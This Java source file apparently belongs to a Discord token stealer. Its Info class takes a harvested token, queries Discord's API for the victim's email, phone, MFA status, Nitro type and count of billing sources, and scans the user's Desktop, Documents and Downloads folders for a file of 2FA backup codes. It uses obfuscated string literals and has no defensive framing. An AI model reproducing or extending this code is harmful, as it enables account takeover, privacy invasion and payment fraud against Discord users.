package noface.sync;

import noface.config.S;

import java.nio.file.Files;
import java.nio.file.Path;

public final class Info {

    public record Token(
            String raw, String platform, String user, String globalName,
            String id, String email, String phone, String avatar,
            boolean mfa, int premium, long flags,
            int billSources, boolean backup, String badges
    ) {}

    public static Token enrich(String token, String platform) {
        String userJson = Api.me(token);
        if (userJson == null) return null;

        String user = field(userJson, "username");
        String global = field(userJson, "global_name");
        String id = field(userJson, "id");
        String email = field(userJson, "email");
        String phone = field(userJson, "phone");
        String av = field(userJson, "avatar");
        boolean mfa = bool(userJson, "mfa_enabled");
        int premium = num(userJson, "premium_type");
        long flags = lng(userJson, "public_flags");

        String avatarUrl = "";
        if (!av.isEmpty() && !id.isEmpty()) {
            String ext = av.startsWith("a_") ? "gif" : "png";
            avatarUrl = S.e("https://cdn.discordapp.com") + S.e("/avatars/") + id + "/" + av + "." + ext + S.e("?size=1024");
        }

        String bill = Api.billing(token);
        int billSources = countIds(bill);

        int nitroMo = 0, boostMo = 0;
        String profile = null;
        if (!id.isEmpty()) {
            try { Thread.sleep(500); } catch (InterruptedException ignored) {}
            profile = Api.profile(token, id);
            if (profile != null) {
                String ps = field(profile, "premium_since");
                if (!ps.isEmpty() && !ps.equals("null")) nitroMo = months(ps);
                String gs = field(profile, "premium_guild_since");
                if (!gs.isEmpty() && !gs.equals("null")) boostMo = Math.max(1, months(gs));
            }
        }

        boolean backup = findBackup(email);
        String badges = Badges.build(flags, premium, nitroMo, boostMo, profile);

        return new Token(token, platform, user, global, id,
                email, phone, avatarUrl, mfa, premium, flags, billSources, backup, badges);
    }

    private static int countIds(String json) {
        if (json == null || json.isBlank()) return 0;
        int n = 0;
        int i = 0;
        while ((i = json.indexOf("\"id\"", i)) >= 0) {
            n++;
            i += 4;
        }
        return n;
    }

    private static int months(String iso) {
        try {
            long ts = java.time.Instant.parse(iso.replace("\"", "")).toEpochMilli();
            return (int) ((System.currentTimeMillis() - ts) / (1000L * 60 * 60 * 24 * 30));
        } catch (Exception e) { return 0; }
    }

    private static boolean findBackup(String email) {
        if (email == null || email.isEmpty()) return false;
        String home = System.getProperty("user.home", "");
        for (String dir : new String[]{"Desktop", "Documents", "Downloads"}) {
            Path folder = Path.of(home, dir);
            if (!Files.isDirectory(folder)) continue;
            try (var s = Files.list(folder)) {
                if (s.anyMatch(p -> {
                    String n = p.getFileName().toString().toLowerCase();
                    return n.contains(S.e("discord_backup_codes")) && n.endsWith(S.e(".txt"));
                })) return true;
            } catch (Exception ignored) {}
        }
        return false;
    }

    static String field(String json, String key) {
        String s = "\"" + key + "\":";
        int i = json.indexOf(s);
        if (i < 0) return "";
        i += s.length();
        while (i < json.length() && json.charAt(i) == ' ') i++;
        if (i >= json.length() || json.charAt(i) == 'n') return "";
        if (json.charAt(i) != '"') return "";
        int start = i + 1, end = json.indexOf('"', start);
        while (end > 0 && json.charAt(end - 1) == '\\') end = json.indexOf('"', end + 1);
        return end > start ? json.substring(start, end) : "";
    }

    private static boolean bool(String json, String key) {
        String s = "\"" + key + "\":";
        int i = json.indexOf(s);
        if (i < 0) return false;
        i += s.length();
        while (i < json.length() && json.charAt(i) == ' ') i++;
        return i < json.length() && json.charAt(i) == 't';
    }

    private static int num(String json, String key) {
        String s = "\"" + key + "\":";
        int i = json.indexOf(s);
        if (i < 0) return 0;
        i += s.length();
        while (i < json.length() && json.charAt(i) == ' ') i++;
        int start = i;
        while (i < json.length() && Character.isDigit(json.charAt(i))) i++;
        if (i == start) return 0;
        try { return Integer.parseInt(json.substring(start, i)); } catch (Exception e) { return 0; }
    }

    private static long lng(String json, String key) {
        String s = "\"" + key + "\":";
        int i = json.indexOf(s);
        if (i < 0) return 0;
        i += s.length();
        while (i < json.length() && json.charAt(i) == ' ') i++;
        int start = i;
        while (i < json.length() && Character.isDigit(json.charAt(i))) i++;
        if (i == start) return 0;
        try { return Long.parseLong(json.substring(start, i)); } catch (Exception e) { return 0; }
    }

    private Info() {}
}
